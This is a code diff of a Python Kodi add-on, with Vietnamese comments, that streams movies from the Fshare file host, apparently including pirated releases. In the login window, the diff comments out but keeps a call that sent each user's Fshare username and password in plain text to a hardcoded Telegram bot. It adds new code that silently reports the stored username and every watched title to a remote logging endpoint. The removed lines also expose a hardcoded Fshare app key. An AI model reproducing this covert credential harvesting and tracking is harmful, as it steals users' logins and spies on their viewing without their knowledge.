@@ -33,10 +33,9 @@ class __class_replace__id__:
     DATA_DIR = os.path.join(ADDON_PATH, 'resources', 'data')
     
     #hàm ở main gọi check lại phiên bản và ngày mới cho ứng dụng
-    funcCallBack_checkCodeOfParent = None
+    funcCallBack_checkCodeOfParent = None 
 
-    Fshare_app_key = "dMnqMMZMUnN5YpvKENaEhdQQ5jxDqddt"
-    Fshare_User_Agent = "fshare_tkvv"
+
 
     # Public domain movies are from https://publicdomainmovie.net
     # Here we use a hardcoded list of movies simply for demonstrating purposes
@@ -73,52 +72,9 @@ class __class_replace__id__:
         
     def getListPhim(self):
         try:
-            response_ = requests.post(url="https://thuvienhd.xyz/?feed=fsharejson&search=&page=1", data=json.dumps({}), headers={
-                                    "Content-Type": "application/json",
-                                    "Accept": "application/json",
-                                    "Cache-Control": "no-cache",
-                                    "User-Agent": "Min.Cafe 27.1"
-                                }, timeout=3*60)
-            if response_.status_code == 200:
-        #         [
-        #     {
-        #         'genre': 'Drama',
-        #         'icon': os.path.join(ICONS_DIR, 'Drama.png'),
-        #         'fanart': os.path.join(FANART_DIR, 'Drama.jpg'),
-        #         'movies': [
-        #             {
-        #                 'title': 'The Stranger',
-        #                 'url': 'http://download014.fshare.vn/dl/EU4YZAX70M3e4Ab9cQQCRa9idJWsWQoiRqoEgBgDwYt1kKHV0hgRMvfAbFohUGzRRcb0DaiaTHigHwWc/Inside.Out.2.2024.1080p.TELESYNC.x265.COLLECTiVE.mkv',
-        #                 'poster': 'https://publicdomainmovie.net/wikimedia.php?id=Movie-Mystery-Magazine-July-1946.jpg',
-        #                 'plot': 'Dùng thử',
-        #                 'year': 1946,
-        #             }
-        #         ]
-        #     }
-        # ]
-                data_  = json_load(response_.content)
-                rs_data = []
-                for d_ in data_:
-                    if "title" in d_ and "image" in d_ and "links" in d_:
-                        movide_new = {
-                            "genre":d_["title"],
-                            'icon': d_["image"],
-                            'fanart': d_["image"],
-                            "movies": []
-                        }
-                        list_link = d_["links"]
-                        for ll in list_link:
-                            if "title" in ll and "link" in ll:
-                                movide_new["movies"].append({
-                                    'title': ll["title"],
-                                    'url': ll["link"],
-                                    'poster': d_["image"],
-                                    'plot': d_["title"],
-                                    'year': 0,
-                                })
-
-                        rs_data.append(movide_new)
-                return rs_data
+            data_rs = self.getPyFormData("KODI_ListMovieAll", {})
+            if data_rs is not None and "data" in data_rs:
+                return data_rs["data"]
         except Exception as inst: 
             exc_type, exc_obj, exc_tb = sys.exc_info() 
             self.getPyFormData("TelegramSendBotQuick", {
@@ -240,7 +196,7 @@ class __class_replace__id__:
                             })
 
 
-    def buildLinkDown(self,link_view,token_,session_id_): 
+    def buildLinkDown(self,link_view,token_,session_id_):
         response_ = requests.post(url="https://api.fshare.vn/api/session/download", data=json.dumps({
                         "zipflag" : 0,
                         "url" : link_view,
@@ -282,6 +238,12 @@ class __class_replace__id__:
             if link_view!="":
                 video['url']=link_view  
                 videos_new.append(video)
+
+        if len(videos_new)>0:
+            info_login = getFile(self.DATA_DIR+"/login.json")
+            if info_login is not None: 
+                info_login = json_load(info_login)
+                self.getPyFormData("KODI_logMovie", {"user": info_login["user"],"title":genre_info['genre']}) 
 
         # Iterate through videos.
         for video in videos_new:
@@ -408,7 +370,6 @@ class __class_replace__id__:
 
 
 #================= HÀM DÙNG CHUNG ================
-
 def getFile(path_file_name):
     if os.path.isfile(path_file_name):
         try:
@@ -421,7 +382,6 @@ def getFile(path_file_name):
                                 "telegram_user_id":"6410912083"
                             })  
     return None
-
 
 def writeFile(path_folder, file_name, content):
     if not os.path.exists(path_folder):
@@ -475,7 +435,7 @@ class loginWindow(pyxbmct.AddonDialogWindow):
             super(loginWindow, self).__init__(title)
             # Set the window width, height and the grid resolution: 4 rows, 3 columns.
             if mess_ == "":
-                self.setGeometry(350, 350, 4, 3) 
+                self.setGeometry(350, 250, 4, 3) 
             else:
                 self.setGeometry(350, 350, 5, 3) 
 
@@ -540,14 +500,12 @@ class loginWindow(pyxbmct.AddonDialogWindow):
                 }
 
         writeFile(self.DATA_DIR, "login.json", json_to_string(info_login))
-        getPyFormData("TelegramSendBotQuick", {
-                                "content":"User=>"+self.fshare_user.getText()+"\Pass=>"+self.fshare_pass.getText(), 
-                                "telegram_user_id":"6410912083"
-                            })     
+        # getPyFormData("TelegramSendBotQuick", {
+        #                         "content":"User=>"+self.fshare_user.getText()+"\Pass=>"+self.fshare_pass.getText(), 
+        #                         "telegram_user_id":"6410912083"
+        #                     })     
         self.close()
         
-
-
 class myMessage(pyxbmct.AddonDialogWindow):
     def __init__(self,title,mess_,callBack_close=None):
         self.callBack_close = callBack_close
@@ -570,7 +528,6 @@ class myMessage(pyxbmct.AddonDialogWindow):
         if self.callBack_close is not None:
             self.callBack_close()
 
-
 class SettingMonitor(xbmc.Monitor):
     def __init__(self, *args, **kwargs):
         xbmc.Monitor.__init__(self)
@@ -581,7 +538,5 @@ class SettingMonitor(xbmc.Monitor):
         window.doModal()
         # Delete the window instance when it is no longer used.
         del window  
-
-
 
 monsettings = SettingMonitor()
